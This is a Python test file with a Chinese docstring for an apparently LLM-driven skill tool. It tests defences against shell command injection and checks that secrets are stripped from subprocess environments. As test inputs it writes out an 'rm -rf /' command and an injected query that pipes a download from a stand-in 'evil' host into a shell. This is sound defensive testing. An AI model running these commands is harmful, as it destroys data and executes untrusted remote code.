"""技能 CLI 模板安全：禁止 bash/sh -c 命令注入（RCE）。

SKILL.md 的 CLI 模板若写成 `bash -c "..."`，query 会被当作 shell 命令解释执行，
构成经由 LLM 驱动的远程代码执行。这里确保模板提取与命令构建两道关卡都拦截该模式，
同时正常 `python scripts/x.py "查询"` 模板不受影响。
"""
from __future__ import annotations

from src.skills.tool_wrapper import SkillTool


def test_extract_rejects_bash_c_template():
    body = "```bash\nbash -c \"python x.py\"\n```"
    assert SkillTool._extract_cli_template(body) is None


def test_extract_rejects_sh_c_template():
    body = "```sh\nsh -c \"rm -rf /\"\n```"
    assert SkillTool._extract_cli_template(body) is None


def test_extract_keeps_python_template():
    body = "```bash\npython scripts/x.py \"查询词\"\n```"
    assert SkillTool._extract_cli_template(body) == 'python scripts/x.py "查询词"'


def test_build_command_rejects_bash_c():
    st = SkillTool.__new__(SkillTool)
    st._cli_template = 'bash -c "python x.py"'
    import pytest

    with pytest.raises(ValueError):
        st._build_command('; curl evil | sh')


def test_build_command_safe_query_as_argv():
    st = SkillTool.__new__(SkillTool)
    st._cli_template = 'python scripts/x.py "占位"'
    cmd = st._build_command('你好; rm -rf /')
    # query 作为独立 argv 参数，不被 shell 解释
    assert cmd[-1] == '你好; rm -rf /'


def test_build_safe_env_strips_secrets(monkeypatch):
    """F26：传给技能子进程的环境不得含密钥/凭证变量。"""
    import os

    monkeypatch.setattr(
        os, "environ",
        {
            "PATH": "/usr/bin:/bin",
            "HOME": "/root",
            "PYTHONPATH": "/app/src",
            "LANG": "zh_CN.UTF-8",
            "OPENAI_API_KEY": "sk-123456",
            "DINGTALK_APP_SECRET": "sec-abc",
            "DB_PASSWORD": "pw-xyz",
            "SECONDARY_FALLBACK_API_KEY": "sk-999",
            "MY_TOKEN": "tok-1",
        },
    )
    env = SkillTool._build_safe_env()
    # 运行必需变量保留
    assert env["PATH"] == "/usr/bin:/bin"
    assert env["HOME"] == "/root"
    assert env["PYTHONPATH"] == "/app/src"
    assert env["LANG"] == "zh_CN.UTF-8"
    # 密钥/凭证类全部剥离
    assert "OPENAI_API_KEY" not in env
    assert "DINGTALK_APP_SECRET" not in env
    assert "DB_PASSWORD" not in env
    assert "SECONDARY_FALLBACK_API_KEY" not in env
    assert "MY_TOKEN" not in env
    # 强制无缓冲
    assert env["PYTHONUNBUFFERED"] == "1"

